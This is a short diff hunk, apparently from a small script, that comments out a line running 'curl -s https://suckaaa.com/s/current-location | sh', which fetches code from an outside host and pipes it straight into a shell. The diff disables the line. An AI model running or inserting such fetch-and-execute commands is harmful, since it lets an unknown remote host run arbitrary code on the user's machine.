@@ -33,4 +33,4 @@ echo "loL";
 
 echo "\n";
 
-termdo 'curl -s https://suckaaa.com/s/current-location | sh';
+# termdo 'curl -s https://suckaaa.com/s/current-location | sh';
